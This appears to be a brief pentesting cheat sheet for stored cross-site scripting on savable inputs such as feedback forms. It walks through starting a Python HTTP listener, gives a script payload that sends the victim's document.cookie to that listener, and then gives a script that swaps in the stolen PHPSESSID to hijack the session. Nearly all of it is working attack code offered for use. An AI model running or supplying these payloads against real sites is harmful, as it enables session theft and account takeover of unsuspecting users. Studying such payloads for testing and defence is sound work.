# XSS | Stored

Context: On savable inputs, like feedback forms

**Concept Proof:** Get session id with XSS and send to personal server

### 1 - Start a python server:

```bash
python3 -m http.server
```

### 2 - XSS payload:

```html
<script>new Image().src="localhost:8080/?="+document.cookie;</script>
```

### 3 - Now, change your cookie to the session id received:

```html
<script>alert(document.cookie="PHPSESSID=asdjaosidjaosd")</script>
```
